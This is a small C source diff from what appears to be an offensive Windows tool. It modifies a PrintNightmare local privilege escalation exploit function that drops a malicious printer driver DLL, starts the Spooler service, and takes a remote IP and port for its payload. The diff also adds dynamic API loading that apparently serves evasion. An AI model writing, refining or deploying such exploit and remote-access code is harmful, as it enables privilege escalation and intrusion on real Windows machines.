@@ -7,6 +7,8 @@
 #include "PipeServer.h"
 #include "MgService.h"
 
+#include "LoadAPI.h"
+
 #define DRIVER_INFO_LEVEL_2		2
 #define DRIVER_NAME_SIZE		30
 
@@ -114,15 +116,15 @@ DWORD WINAPI ThreadPipeServer(LPVOID lpvParam){
 	return -1;
 }
 
-BOOL ExploitPrintNightmareLPE(char* PathExeToRun, WCHAR* UipAddress, char* port, char* wincatDefaultDir){
+BOOL ExploitPrintNightmareLPE(Advapi32_API advapi32, char* PathExeToRun, WCHAR* UipAddress, char* port, char* wincatDefaultDir){
 	const char* dllName = "DriverPrinter.dll";
 	const char* serviceName = "Spooler";
 
-	if (CheckServerStatus((char*)serviceName) == SERVICE_NOT_RUNNING){
-		if (StartServer((char*)serviceName) == SERVICE_ERROR)
+	if (CheckServerStatus(advapi32,(char*)serviceName) == SERVICE_NOT_RUNNING){
+		if (StartServer(advapi32,(char*)serviceName) == SERVICE_ERROR)
 			return FALSE;
 	}
-
+	 
 
 	/*if (!SaveRHostInfo(UipAddress, port)){
 		printMsg(STATUS_ERROR2, LEVEL_DEFAULT, "Fail to save info in reg (RHost)");
